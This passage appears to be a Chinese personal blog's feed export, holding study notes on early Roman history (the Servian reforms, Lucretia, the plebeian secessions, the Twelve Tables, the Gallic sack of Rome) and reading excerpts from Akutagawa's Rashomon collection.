<p>​	<em>库里亚大会</em>由全体氏族的成年男子参加，负责处理国家事务中的重大问题。有选举国王、宣战议和、对法案和死刑的表决权，但是没有提案的权力。</p>
<p>​	长老议事会有权提前讨论库里亚大会的重大问题和审查库里亚大会上表决通过的国王提案，拥有否决权。</p>
<p>​	由于其成员大多出自贵族，所以长老议事会对国家的事务决策具有很大影响力</p>
<p>​	罗马的王政时期一般认为有<u>七个王</u>，分别是罗穆路斯、努玛、图努斯、安库斯、老塔克文、塞尔维乌斯和小塔克文。</p>
<p>​	在前五位王的指引下，罗马城有了一定的扩张，吸纳了周围越来越多的外族人，人口也越来越多。</p>
<p>​	这些新进外族与旧有的三百个氏族之间自然会产生矛盾。</p>
<p>​	此时，罗马的旧治理体系不能适应社会的这种变化。所以，在第六位王<strong>塞尔努乌斯</strong>（578-534 BC）的执政时期，对罗马的军事和政治进行了一系列<em>改革</em>。</p>
<p>​	他推行人口和财产普查，按照财产多少划分居民的等级。不同的等级有不一样的权力和义务。</p>
<p>​	比如处于第一等级的富豪们要负责组成80个重装步兵百人队，18个骑兵百人队，武器自备；而 处于不入流最低等级的无产者们（第六级）只需要组成1个轻装步兵百人队。</p>
<p>​	在百人队的基础上，塞尔维乌斯建立了新的国家机构——百人队大会，又称<em>森都利亚大会</em>，负责处理宣战、选举、审判重大案件等重要事务。</p>
<p>​	可以发现，森都利亚大会与库里亚大会的权力重叠。</p>
<p>​	实际上，在改革之后，库里亚大会曾经的政治地位被森都利亚大会逐渐取代。</p>
<p>​	区别是，森都利亚大会表决时，每个百人队只有一票。其中，第一等级的富有者，合计98票，而后五个等级全加起来也才95票。</p>
<p>​	也就是说，改革后的罗马权力从库里亚大会的旧氏族人民参政制度转变为富有者统治、有产者参政的制度，而无产者被剥夺了参政权。</p>
<p>​	另外，塞尔维乌斯还将罗马城划分为四个区。</p>
<p>​	凡征兵、税收等事务都不再以旧有的三个部族为依据，而是以四个区为准。</p>
<p>​	塞尔维乌斯改革打破了旧氏族血缘社会时期贵族与平民的界限。因为此时富有的平民即使没有显赫的家世，也可以参政议政。</p>
<p>​	他建立了<u>以财产为划分标准的阶级关系</u>。这是<u>罗马从氏族社会向国家转变的关键步骤</u>。</p>
<p>​	因此，<em>塞尔维乌斯改革是罗马国家形成的标志</em>。</p>
<p>​	公元前535年，罗马王政时代的第七位国王<strong>小塔克文</strong>登基，他是第五位王老塔克文的儿子，据说他是靠暗杀塞尔维乌斯而夺取王位的。执政期间独断专行、厉行暴政。</p>
<p>​	公元前510年，国王塔克文在外征战，塔克文派他的儿子<strong>塞斯图斯</strong>前往科拉提亚。在科拉提亚，塞斯图斯受到了另一位王氏宗亲<strong>克拉第努斯</strong>的热情接待。</p>
<p>​	克拉第努斯有一个以忠贞贤惠而闻名的妻子，名叫<strong>鲁克丽丝</strong>。</p>
<p>​	一天，塞斯图斯和克拉第努斯在军营里聚餐吃饭。他们比谁的妻子更好、更贤惠，两人谁都不服谁。</p>
<p>​	夜里两个前往各自妻子的营帐，只有鲁克丽丝在勤劳地织布。夜里，当众人都回到营地后，塞斯图斯见色起意又溜了回来，并偷偷潜入鲁克丽丝的卧室。</p>
<p>​	第二天，鲁克丽丝穿了一身黑，来到父亲和丈夫面前跪求他们原谅，她一五一十的把昨晚被迫的事情描述了一遍。她对众人说，一定要报仇，虽然对方是当今的王子，也绝不能草草了事。</p>
<p>​	在场的人议论纷纷，就在大家讨论这件事怎么办的时候，鲁克丽丝不甘受辱，她突然拔出匕首，自杀以正清白。</p>
<p>​	克拉第努斯看到倒在血泊中的妻子，悲痛欲绝。众人一边对鲁克丽丝心生怜悯，一边对当权者的无道充满愤恨。</p>
<p>​	这时，克拉第努斯的朋友<strong>布鲁图斯</strong>捡起了那把带血的匕首，对神发誓，暴君不除，绝不生还。</p>
<p>​	她带着鲁克丽丝的尸体，来到罗马广场上，向民众宣告着王室的暴行。他的一番演讲，将民众心中久久积压的怒火转变为反抗压迫的力量。</p>
<p>​	他们联合起来，组建军队。公元前509年，推翻了国王塔克文的统治。</p>
<p>​	革命者为罗马建立了一个新的政治制度——<em>共和制</em>。民众推举布鲁图斯和克拉第努斯为执政官。</p>
<p>​	<u>历时240多年的罗马王政时代结束（753-509BC），从此开始了罗马共和国时代</u>。</p>
<ul>
<li>
<p>相关阅读：莎士比亚《鲁克丽丝受辱记》</p>
<ul>
<li>
<p>原文！写的真入微</p>
</li>
<li>
<p><a href="https://www.diyifanwen.com/sicijianshang/mingjiaaiqingshi/221844869_7.html">莎士比亚诗选-鲁克丽丝受辱记 (diyifanwen.com)</a></p>
</li>
</ul>
</li>
</ul>
<h3 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h3>
<p>当时看完这p去搜了莎士比亚写的这首诗。看完……还没看完，就觉得好长、好长啊……当然莎士比亚这个文笔也真的是山路十八弯九曲回肠的非常婉转诗意啊</p>
]]></content>
      <categories>
        <category>文史哲</category>
        <category>世界史</category>
        <category>罗马史</category>
      </categories>
      <tags>
        <tag>reading</tag>
        <tag>世界史</tag>
        <tag>罗马史</tag>
      </tags>
  </entry>
  <entry>
    <title>【从城邦到帝国】3_平民改革_立法图强</title>
    <url>/project/2024/07/13/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%96%E7%95%8C%E5%8F%B2/%E7%BD%97%E9%A9%AC%E5%8F%B2/%E3%80%90%E4%BB%8E%E5%9F%8E%E9%82%A6%E5%88%B0%E5%B8%9D%E5%9B%BD%E3%80%913_%E5%B9%B3%E6%B0%91%E6%94%B9%E9%9D%A9_%E7%AB%8B%E6%B3%95%E5%9B%BE%E5%BC%BA/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p><a href="https://www.bilibili.com/video/BV1wd4y1h7pP/?spm_id_from=333.999.0.0&amp;vd_source=3f0983ef34615b702fec513c41e55a64">视频地址</a>  是之前很喜欢练习打字（×的一段时间，看视频然后一个个字打下来的，当时视频说一句话我打一句，一个二十分钟的视频得看两倍时间，现在想来还真是降低开发效率的一些操作（捂脸）  都存在幕布那边，这回一次性整理一下</p>
<h3 id="平民改革-立法图强"><a class="header-anchor" href="#平民改革-立法图强">¶</a>平民改革 立法图强</h3>
<h4 id="背景"><a class="header-anchor" href="#背景">¶</a>背景</h4>
<ul>
<li>
<p><strong>罗马人</strong>通过三次维爱战争，击败了埃特鲁里亚人，迈出了对外征服的第一步。但是好景步长，北方强大的<strong>高卢人</strong>南下，打败罗马军队，罗马城也被洗劫一空。自此之后，高卢人的凶猛给罗马人造成了心理阴影。而罗马经过此次大劫，损失惨重，元气大伤，但她并没有喘息之机。</p>
</li>
<li>
<p>此前臣服于罗马的<strong>沃尔西人</strong>、<strong>厄奎人</strong>和部分埃特鲁里亚城邦趁虚反叛，而与之交好的拉丁同盟和赫尔尼西人也背弃盟约。</p>
</li>
<li>
<p>经过40余年的斗争，罗马解决了自高卢之患后反叛者与近邻的矛盾，稳固了在亚平宁半岛中北部的统治地位。</p>
</li>
<li>
<p>这一段时期的罗马，除了应付外患，还要解决内部激烈的平民与贵族斗争（前494-前287）。并且，其内忧与外患相互影响。</p>
</li>
<li>
<p><u>罗马的<em>共和制</em>是一种<em>贵族执政</em>的共和，其贵族源自氏族时期的显赫世家</u>。</p>
<ul>
<li>
<p>早在罗穆路斯时代，就有所谓的“100名贤能者”处理国是。</p>
</li>
<li>
<p>后来，<strong>萨宾人</strong>的合并加了100，老塔克文上台又加了100，这些人组成了元老院，被人尊称为“元老”。</p>
</li>
<li>
<p>元老们的家族和后代就成为了罗马的早期贵族，而与贵族相对应的是广大平民。</p>
</li>
<li>
<p>平民的来源比较复杂，主要是罗马本地平民、零散迁居的外乡人和被征服的拉丁部落等。</p>
</li>
</ul>
</li>
<li>
<p><u>平民与贵族的社会地位十分不平等</u>。</p>
<ul>
<li>
<p>共和早期，政府的公职、神职和元老都是清一色的贵族出身。</p>
</li>
<li>
<p>贵族世家的长期垄断，进而形成了上层社会的小圈子。比如法比乌斯、克劳狄乌斯、埃米利乌斯、科尔涅利乌斯都是当时的显赫世家。</p>
</li>
<li>
<p>并且，贵族在政治、司法、宗教和分配上享有特殊权力。</p>
</li>
<li>
<p>虽然在王政时代，经过塞尔维乌斯改革，贵族权力遭到削弱，但也仅仅只是有所削弱。</p>
</li>
</ul>
</li>
<li>
<p><u>另外，平民也是分三六九等的</u>。</p>
<ul>
<li>
<p>比如那些靠经营工商业而发家致富的平民，在积累了一定的财富后，不甘心被罗马的旧贵族排挤在政治生活之外，也想寻求更高的政治权力和社会地位。</p>
</li>
<li>
<p>此外，随着对外扩张，罗马的土地总量确实越来越多。</p>
</li>
<li>
<p>但是由于贵族的特权占有，平民依然是无地少地。</p>
</li>
<li>
<p>加上连年征战，农民频繁服兵役，致使土地荒废，粮食歉收。越来越多的农民经济得不到保障而负债累累，甚至沦为债务奴隶，遭到债权人的任意荼毒、盘剥。</p>
</li>
<li>
<p>那时候的罗马平民无论高低贵贱，都是处在被压迫和被排挤的社会环境中的。</p>
</li>
<li>
<p>所以平民为了切身利益，就不得不联合起来与贵族进行斗争。</p>
</li>
</ul>
</li>
</ul>
<h4 id="第一次"><a class="header-anchor" href="#第一次">¶</a>第一次</h4>
<ul>
<li>
<p><u>罗马的平贵斗争没有通过暴力革命，而是以一种特别的方式</u>。</p>
<ul>
<li>
<p>公元前494年，罗马对外征战，急需兵源，但是国内的农民却不愿服兵役。</p>
</li>
<li>
<p>于是执政官下令释放因债务纠纷而入狱的犯人，并承诺去前线参战就可以既往不咎。于是，农民和犯人都积极参军、奋勇杀敌。</p>
</li>
<li>
<p>可是，当这些人都脱去戎装，返回罗马时，迎接他们的不是荣耀与欢呼，而是屈辱的牢狱和枷锁。</p>
</li>
<li>
<p>这种言而无信的行为，激起民众的不满。平民要求变法，却又遭到元老院的一致反对。</p>
</li>
<li>
<p>于是平民百姓忍无可忍，集体离开罗马城，撤往不远处的山头上，扬言要另建一座新城。</p>
</li>
<li>
<p>失去了人口，等于失去了一切，这对几乎连年征战的罗马是致命的打击。那些贵族只好与平民谈判，接受平民的请愿。<u>平民<strong>保民官</strong>就这样应运而生</u>（人数从2-5-10）</p>
</li>
</ul>
</li>
</ul>
<h4 id="保民官"><a class="header-anchor" href="#保民官">¶</a>保民官</h4>
<ul>
<li>
<p><strong>保民官</strong>作为平民的代表，有权向元老院提出申诉和抗议，比如阻止官员滥用职权，否决对平民不利的立法。</p>
<ul>
<li>
<p>并且，保民官的人身安全神圣不可侵犯。</p>
</li>
<li>
<p>自此之后，<u>平民与贵族的矛盾就表现为保民官与贵族之间的斗争</u>。</p>
</li>
<li>
<p>公元前471年，平民保民官<strong>沃来罗·帕波利乌斯</strong>（Volero Publilius）又争取到保民官只能由平民选举的权力，避免了贵族的干涉。</p>
</li>
<li>
<p>但是，罗马平贵斗争远远没有结束。像罗马平民这种不合作的革命方式未来还要上演四次。</p>
</li>
</ul>
</li>
<li>
<p>和很多文明一样，那时候的罗马没有<em>成文法</em>，很多判决都是依靠人治和习惯法，致使平民权力常常得不到保障。</p>
<ul>
<li>
<p>公元前462年，保民官<strong>特伦里乌斯·哈尔萨</strong>（Terentilius Harsa）最早提出了编纂成文法的要求。</p>
</li>
<li>
<p>但是，直到公元前451年，才由贵族组成了一个10人立法委员会去编纂法律。</p>
</li>
<li>
<p>这10人研究了一年，弄了10张表，但是没编完；第二年，又换了5个贵族和5个平民接盘，终于搞了12张表；</p>
</li>
<li>
<p>加上后续的一些补充，就形成了著名的**《十二铜表法》**。</p>
</li>
</ul>
</li>
</ul>
<h4 id="《十二铜表法》"><a class="header-anchor" href="#《十二铜表法》">¶</a>《十二铜表法》</h4>
<ul>
<li>
<p>**《十二铜表法》**是罗马对以往习惯法的汇编，包括诉讼、债务、宗法、监护、遗产、契约、贸易、土地、伤害、宗教、婚姻等方面。</p>
<ul>
<li>
<p>虽然这个法律是明确维护贵族的既得利益，但是也从一定程度上限制了贵族权力，使其不能像过去那样肆意解释法律。</p>
</li>
<li>
<p>从这一点看，这依然是<u>平贵斗争中属于平民的一次重大胜利</u>。</p>
</li>
<li>
<p>让罗马人引以为傲的《十二铜表法》在历史上从未被废除，有些条款一直延续到罗马后期。该法律的语言也成为后世法典的语言典范</p>
</li>
<li>
<p>十二铜表法被认为是现今欧陆法系中“罗马法”的源头之一。</p>
</li>
</ul>
</li>
<li>
<p>公元前444年到公元前367年，可能是出于军事需要，也可能是平贵斗争的结果，这近80年之间，罗马只有22年选了执政官，剩下的时间全部由军政官代替。因为这种官职平民也可以担任。</p>
<ul>
<li>
<p>后来又出现了监察官、财务官等职位，均对平民开放。</p>
</li>
<li>
<p><u>贵族对国家公职的垄断从此有所改变</u>。</p>
</li>
</ul>
</li>
</ul>
<h4 id="持续"><a class="header-anchor" href="#持续">¶</a>持续</h4>
<ul>
<li>
<p>高卢战争后，罗马城遭到严重破坏，城市被焚，土地荒芜，不少小农直接破产，沦为佃户。</p>
<ul>
<li>
<p>而贵族为了转嫁损失，就对底层平民进行更重的盘剥和压迫。</p>
</li>
<li>
<p>这就导致土地、债务和政治平权等问题再次以平贵斗争的形势提上日程。</p>
</li>
</ul>
</li>
<li>
<p>公元前367年，通过李锡尼-绥克斯图法案，减免债务利息，并且平民可当选执政官。</p>
<ul>
<li>
<p>公元前356年，平民也可以担任独裁官和监察官。</p>
</li>
<li>
<p>公元前342年，通过盖努西乌斯法案，两个执政官均可由平民担任。</p>
</li>
<li>
<p>公元前326年，通过波提利乌斯法案，废除债务奴隶制。</p>
</li>
<li>
<p>公元前300年，通过古尔尼乌斯兄弟法案，平民也可以担任一直由贵族垄断的宗教职务。</p>
</li>
<li>
<p>至此，<u>罗马的平贵之间在担任国家公职方面几乎没有区别</u>。</p>
</li>
</ul>
</li>
<li>
<p>公元前287年，罗马爆发第五次<em>平民撤离运动</em>，迫使独裁官承认，平民的决定对全体公民具有法律效力。</p>
<ul>
<li>这件事，<u>标志着罗马的平贵斗争彻底结束</u>。</li>
</ul>
</li>
<li>
<p>会想到公元前494年，发生第一次撤离运动时，彼时的罗马还是一个矛盾激化、几乎分裂的国家；经过两百多年的平民与贵族斗争，到公元前287年的最后一次撤离运动结束时，<u>罗马共和国成功转型</u>，成为一个团结的国家。</p>
<ul>
<li>
<p>旧氏族显贵逐渐衰落，平民的上层成为国家新贵掌握权力，组成新的统治集团；</p>
</li>
<li>
<p>平民的中下层地位也有所改善：土地分配，债务减免，缓和了土地兼并，使罗马的小农生计得以维持。</p>
</li>
<li>
<p>农民有了土地，对外征服的人力资源就有了保障。</p>
</li>
</ul>
</li>
<li>
<p>此外，在斗争中，罗马共和国的国家制度也逐渐完善，设立了更多有针对性的官职，以处理日益复杂的国家事务。</p>
</li>
<li>
<p>在罗马的政治体制中，元老院依然是权力中枢，是最重要的国家机关。</p>
</li>
<li>
<p><em>非暴力不合作运动</em>也是解决社会矛盾的一种方式，而那时的罗马恰好有一群和平理性的抗争者，也有一群比较理性、能够自我克制的被抗争者，才能使罗马在如此低的成本之下，完成社会的进步与发展</p>
</li>
</ul>
<h3 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h3>
<ul>
<li>很有启发意义的一话</li>
</ul>
]]></content>
      <categories>
        <category>文史哲</category>
        <category>世界史</category>
        <category>罗马史</category>
      </categories>
      <tags>
        <tag>reading</tag>
        <tag>世界史</tag>
        <tag>罗马史</tag>
      </tags>
  </entry>
  <entry>
    <title>【从城邦到帝国】2_北蛮入侵_罗马危机</title>
    <url>/project/2024/07/06/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%96%E7%95%8C%E5%8F%B2/%E7%BD%97%E9%A9%AC%E5%8F%B2/%E3%80%90%E4%BB%8E%E5%9F%8E%E9%82%A6%E5%88%B0%E5%B8%9D%E5%9B%BD%E3%80%912_%E5%8C%97%E8%9B%AE%E5%85%A5%E4%BE%B5_%E7%BD%97%E9%A9%AC%E5%8D%B1%E6%9C%BA/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p><a href="https://www.bilibili.com/video/BV1wd4y1h7pP/?spm_id_from=333.999.0.0&amp;vd_source=3f0983ef34615b702fec513c41e55a64">视频地址</a>   是之前很喜欢练习打字（×的一段时间，看视频然后一个个字打下来的，当时视频说一句话我打一句，一个二十分钟的视频得看两倍时间，现在想来还真是降低开发效率的一些操作（捂脸）  都存在幕布那边，这回一次性整理一下</p>
<h3 id="北蛮入侵-罗马危机"><a class="header-anchor" href="#北蛮入侵-罗马危机">¶</a>北蛮入侵 罗马危机</h3>
<p>公元前509年，罗马人在布鲁图斯和克拉第努斯的带领下推翻国王，以此为起点，直到公元前27年，元老院授予<strong>屋大维</strong>“奥古都斯”称号为止的这四百八十二年间，称<u>罗马共和国</u>。</p>
<p><u>两条主线</u></p>
<p><em><strong>一  平民与贵族的斗争  使罗马的各项制度趋于完善</strong></em></p>
<p><em><strong>二  大规模的对外扩张  使罗马确立地中海霸权</strong></em></p>
<p>自从布鲁图斯和克拉第努斯推翻王政后，元老院同意从贵族中推选两名<strong>执政官</strong>，以代替原来的国王治理国家。</p>
<p>这两人权力相等，彼此制衡，且执政官的任期只有一年，卸任后自然回归元老院，国家将再度选举新执政官（老执政官依然可能再度当选）。</p>
<p>当国家处于战争等非常时期，为了确保权力集中，以处理国是，将由元老院推举<strong>独裁官</strong>。</p>
<p>这个独裁官可能是执政官，也可能是其他元老中的某一位。</p>
<p>罗马共和国为了避免独裁官权力过于膨胀，又规定独裁官只能任职六个月。如果任期将满，而国家仍处于非常时期，则由元老院再行选举，老独裁官也可能会连任。</p>
<p>此外罗马还完善其他官制，比如<strong>保民官</strong>、<strong>市政官</strong>之类。</p>
<p>共和之初的罗马强邻环伺，只是亚平宁半岛上众多国家或部落中的一个小国。</p>
<p>在她的背面是意大利最强大的埃特鲁里亚人，南面是沃尔西人、萨莫奈人、希腊人等，生存环境十分恶劣。</p>
<p>共和国最初的一百多年，罗马人就是在不断的和近邻的战斗中度过的。</p>
<p>公元前五世纪下半叶，罗马人在与沃尔西人的较量中转入优势。与此同时，罗马人与埃特鲁里亚人之间也爆发战争。</p>
<p>距离罗马城东北方向十二英里处有一座埃特鲁里亚人的重镇<em>维爱城</em>。早在王政时期，双方就因为水源、土地、盐、奴隶等各种原因经常打仗。</p>
<p>公元前479年，罗马对<em>维爱战争</em>中失利；公元前430年，罗马人扳回一局；</p>
<p>公元前405年，罗马再次进军，意图吞并维爱（Veii）。而这次出兵先后持续了10年。直到公元前396年，罗马执政官<strong>卡米卢斯</strong>（Camillus）夺取城池。</p>
<p>经过三次<u>维爱战争</u>，罗马的<em>埃特鲁里亚之患</em>从此消失，其势力也从拉丁平原扩张到意大利北部。</p>
<p>这场战争也是<u>罗马开始对外征服的标志</u>。</p>
<p>罗马在被征服的城市建立殖民地，和被征服者订立盟约，并排遣自己人去监督和统治这些地方，进而形成了自治、半自治或同盟关系。</p>
<p>公元前391年，一支<em>高卢</em>人部落（赛农人Senone）在布伦努斯的率领下从北意大利沿着亚德里亚海岸一路摧枯拉朽，十分骁勇。</p>
<p>攻打至埃特鲁里亚的克鲁西姆城时（今：Chiusi），克鲁希姆告急，向罗马求援。</p>
<p>罗马元老院向这支高卢人部落派遣了三个使臣，勒令停战，结果在谈判席上，双方进行了一波不太友好的交谈，两方人打了起来。</p>
<p>期间，罗马使者还杀了一个高卢的小头目。遭受奇耻大辱的高卢人在几天后便排遣大军杀向罗马</p>
<p>公元前390年，两军在距离罗马城北16公里外的阿里亚小河交战（Battle of the Allia）。</p>
<p>高卢人突然兵临城下，令罗马人十分惊讶，以至于罗马军几乎没有时间搭建营地和防御工事就匆匆投入战场。</p>
<p>为了避免被全歼，罗马军将战线拉长，并分兵排遣一支部队驻扎在军阵右侧的小山上。</p>
<p>高卢首领布伦努斯察觉到罗马人的动向，他担心一旦两军交战，罗马的右翼会从己方军阵的后方发起袭击，届时恐于己不利，于是他直接命令手下向罗马军右翼率先发起进攻。</p>
<p>罗马军左翼部队紧急向右军靠拢，而高卢军早已杀入军阵，拦住左翼去路，双方陷入混战。</p>
<p>可能是因为高卢人的剑比罗马人的长，使得战斗中的罗马人全线劣势，军心大乱。渐渐的越来越多的人在恐慌之中四处逃窜，左翼撤往维爱，右翼撤往罗马。</p>
<p>而高卢人对于这场轻而易举取得的胜利感到十分震惊。处理完战场后，他们集结军队继续向罗马城进发。</p>
<p>此时，罗马败退的军队大多数已经逃往维爱，少部分逃到罗马，而那些逃到罗马的人认为自己力量弱小，根本不是高卢人的对手，固守城池等于必死无疑。</p>
<p>于是，他们中的青壮年带着给养退守卡皮托尔山，只留下了少数妇孺老人（包括一些元老）在城市中。</p>
<p>当高卢大军抵达罗马城下时，发现城门大开，无人看守，顿时就起了疑心。</p>
<p>为了避免意外，高卢军很小心的在罗马与阿尼奥河之间扎营（今：Aniene River）。第二题，高卢人留下小队留守城门，剩下的大部队入城劫掠。他们进了城，发现街道上有一些路障，贵族的议事厅大门也是敞开的，城里异常的安静。就在他们以为这是个空城的时候，一个高卢人注意到几位衣着华丽的老者坐在不远处的走廊台阶上。他们面无表情，似乎内心毫无波澜。</p>
<p>高卢人走上去，仔细端详这几位一反常态的老者，并好奇地伸手去摸了摸其中一位老者长长的胡子。这时，老人举起手中的象牙拐杖，敲了下那个高卢人的头。而高卢人反手一刀索了他的命，余者亦无一幸免。</p>
<p>为了让那些逃至山中的罗马人回城救援他们的财物和亲人，高卢人放火烧城并大肆劫掠。</p>
<p>高卢军见罗马人没能中计，主动冲山。罗马军以逸待劳，加之居高临下，拼死抵抗，化解了高卢人的数次进攻。</p>
<p>高卢人见攻山不利，于是在山脚下布阵，将山上的罗马人全部包围。</p>
<p>此前逃到维爱城的罗马军也重新集结起来，他们将维爱城中的埃特鲁里亚奴隶充军，加上拉丁同盟的支持，军队恢复些许元气。随后在元老院的批准下，将此前被驱逐的前执政官<strong>卡米卢斯</strong>召回并任命为<strong>独裁官</strong>。卡米卢斯带领军队向罗马进发。</p>
<p>在卡皮托尔山下，高卢人打探到一条上山小道，于是高卢军悄悄上山意图偷袭罗马人。眼看着就要接近罗马营地时，一只**<u>大鹅</u>**突然嘎嘎大叫，罗马人惊醒，将高卢人击退。随后的日子里，双方一直僵持不下。</p>
<p>高卢军营内出现疟疾，不少士兵倒下。高卢人派使者找罗马人谈判，但罗马指挥官得知援军正在赶来的路上，于是拒绝，但士兵挨饿。随后双方经过谈判，罗马同意支付一千磅黄金。</p>
<p>在交付的时候，高卢人故意用一个不准的秤去称黄金，罗马人十分恼怒上前交涉。这时，高卢首领布伦努斯将剑丢到了秤的另一头。罗马人迫于形势，也只好忍着屈辱去搬更多的黄金放在秤上。</p>
<p>就在这个添黄金的关头，维爱的援军在卡米卢斯的率领下终于赶到罗马。双方无法谈拢，只能再次开战（BC 390-BC 387），此次交战，罗马取得大胜，高卢军惨败而逃。</p>
<p>这段故事由<strong>李维</strong>（Titus Livius）记载。其他史书还有不同记载，比如高卢人向罗马人勒索赎金之后便撤军走了。由于年代久远，历史学家对这些记载的真实性持不同观点。</p>
]]></content>
      <categories>
        <category>文史哲</category>
        <category>世界史</category>
        <category>罗马史</category>
      </categories>
      <tags>
        <tag>reading</tag>
        <tag>世界史</tag>
        <tag>罗马史</tag>
      </tags>
  </entry>
  <entry>
    <title>《罗生门》读书摘记</title>
    <url>/project/2024/07/04/reading/%E5%A4%96%E5%9B%BD%E6%96%87%E5%AD%A6/%E6%97%A5%E6%9C%AC%E6%96%87%E5%AD%A6/%E3%80%8A%E7%BD%97%E7%94%9F%E9%97%A8%E3%80%8B%E8%AF%BB%E4%B9%A6%E6%91%98%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>这本书好像是芥川龙之介的作品集，只是以最出门的《罗生门》命名，其中包含了《罗生门》《鼻》《手帕》《地狱变》《蛛丝》《橘》《舞会》《密林中》《矿车》《阿富的贞操》《一篇爱情小说》《单相思》《侏儒警语》等文章。</p>
<p>目前看到的部分是《地狱变》 读起来感觉是跟《罗生门》一样印象深刻的作品。</p>
<p>本文是以上作品的一些句子摘录以及一些可能对自分の文学创作（？有益的批注</p>
<h3 id="摘录始于此"><a class="header-anchor" href="#摘录始于此">¶</a>摘录始于此</h3>
<h4 id="译本序"><a class="header-anchor" href="#译本序">¶</a>译本序</h4>
<p>书山稗（bai四）海，文史苑囿（you四），于中沉潜含玩，钩沉抉隐，一旦发而为文，自是信手拈来。随机生发，纵横捭（bai三）阖，不可抑勒。从王侯衙役到市井小民，从寺院高僧到天主教徒，从紫宸之深到江湖之远，在其笔下无不呼之即来，腾跃纸上。</p>
<ul>
<li>
<p>钩沉抉隐：“钩沉”与“抉隐”意思相近，都有“探索深奥的道理或散失的内容”的意思</p>
</li>
<li>
<p>沉潜：①在水里潜伏、沉没。②思想感情深沉，不外露。③集中精神；潜心</p>
</li>
</ul>
<p>值得注意的是，芥川的历史题材小说并非为了演绎历史典故和翻拍历史人物，而是身披历史戏装的“现代小说”，目的在于借古喻今，针砭时弊，臧否人物，传达现代人的生命窘态和灵魂质地。……原典出入自如，布局浑然天成，主题独出机杼，笔致摇曳生姿。</p>
<ul>
<li>臧否：①褒贬，评论   ②善恶</li>
</ul>
<p>芥川生性敏感，纵然一件司空见惯的小事，也往往使其脆弱的神经震颤良久。一般来说，他不重描绘而意在发觉，疏于叙述而工于点化。少的是轻灵与潇洒，多的是沉郁与悲凉。</p>
<p>无论得于史料之作，还是拾于现实之篇，其一以贯之者，大约是以下两条主线。一是对人性中“恶”的暴露、揶揄和鞭挞。第二条主线便是对人对人生的幻灭感亦即厌世主义倾向所导致的对艺术的执着与痴迷，这或许也是出于对前者的一种补偿心理。</p>
<p>尤为可贵的是，“他有意识地创造了文体——不是陈陈相因（的文体，而是一扫庸俗气味的艺术文体”（中村真一郎语），堪称典型的艺术至上者。</p>
<ul>
<li>陈陈相因：粮仓里的米谷一年接一年地堆积起来。比喻沿袭老一套，没有改进。</li>
</ul>
<p>可以说，对中国古典的向往和对中国现实的鄙视是芥川“中国认识”的一对矛盾。前者使之怀有文化上的自卑，后者催生其现实中的傲慢（“日本优越论”）。这其实也是日本近现代主流知识分子或精英阶层共同的基本倾向，纵令夏目漱石亦不例外。愈到后来，自卑愈见其轻而傲慢愈见其烈，在结果上成为日本对外扩张和侵华战争所以顺利推进的重要思想舆论资源和社会基础。</p>
<ul>
<li>
<p>纵令：即使——用在偏正复句的偏句，表示假设的让步，即退一步提出某种情况。  例句：纵令失败，我们也要继续实验。</p>
</li>
<li>
<p>黄钟大吕：形容音乐或言辞庄严、正大、高妙、和谐。  例句：①这首乐曲饱含一种黄钟大吕的气势。  ②他的这篇短文十分朴素，却如黄钟大吕，震撼人心。  ③堪称黄钟大吕的鸿篇巨制</p>
</li>
</ul>
<h4 id="鼻"><a class="header-anchor" href="#鼻">¶</a>鼻</h4>
<p>人的内心存在两种相互矛盾的情感。无疑，没有人不同情他人的不幸。可是，一旦对方好歹从不幸中挣扎出来，却又因此产生若有所失的怅惘。说得夸张一点，甚至出现一种想使之重新陷入不幸的心理。于是，不觉之间开始对其怀有某种敌意，尽管是消极的敌意。不知个中缘由的内供之所以怏怏不快，无非是因为他从池尾僧俗的态度中，隐隐觉察出了这些旁观者的利己主义。</p>
<h4 id="地狱变"><a class="header-anchor" href="#地狱变">¶</a>地狱变</h4>
<p>这是因为，良秀笔下的众多罪人，上至三公九卿下至乞丐贱民，网罗了各色人等。有峨冠博带的庙堂高官，有花枝招展的年轻宫女，有颈挂麻纸的诵经僧，有高底木屐的书童，有长裙飘飘的豆蔻侍女，有手持供钱的阴阳先生，无暇一一列举。总之，如此形形色色的诸多男女，无不惨遭牛头马面的摧残，在上下翻腾的浓烟烈火中如风吹败叶般四下狼狈逃窜。</p>
<p>那被烟呛得白惨惨的面庞，那随火乱舞的长飘飘的秀发，那转瞬化为火焰的美艳艳的樱花盛装——所有这些是何等惨不忍睹啊！尤其每当夜风向下盘旋而烟随风披靡之时，金星乱坠的红通通的火焰中便闪现出少女咬着堵嘴物而始终拼命挣脱锁链时那痛苦扭动的情形，令人觉得地狱的大苦大难活生生展现于眼前。</p>
<p>刚才还在为地狱的惨烈场面惊恐困惑的良秀，此刻那满是皱纹的脸上浮现出无可名状的光辉——一种近乎恍惚状态的由衷喜悦之情。</p>
]]></content>
      <categories>
        <category>文史哲</category>
        <category>外国文学</category>
        <category>日本文学</category>
      </categories>
      <tags>
        <tag>reading</tag>
        <tag>外国文学</tag>
        <tag>日本文学</tag>
      </tags>
  </entry>
  <entry>
    <title>【中国神话-冥界篇】1_三魂七魄</title>
    <url>/project/2024/07/07/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%AD%E5%9B%BD%E5%8F%B2/%E4%B8%AD%E5%9B%BD%E7%A5%9E%E8%AF%9D/%E5%86%A5%E7%95%8C%E7%AF%87/%5B%E4%B8%AD%E5%9B%BD%E7%A5%9E%E8%AF%9D-%E5%86%A5%E7%95%8C%E7%AF%87%5D-1-%E4%B8%89%E9%AD%82%E4%B8%83%E9%AD%84/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>[视频地址](<a href="https://www.bilibili.com/video/BV1yA411V7ko/?spm_id_from=333.337.search-card.all.click&amp;vd_source=3f0983ef34615b702fec513c41e55a64">[中国神话-冥界篇 合集]中国古代魂魄观念大盘点！让你理清中国人的灵魂观！_哔哩哔哩_bilibili</a>)    感觉自分乃亚文化爱好者HHH</p>
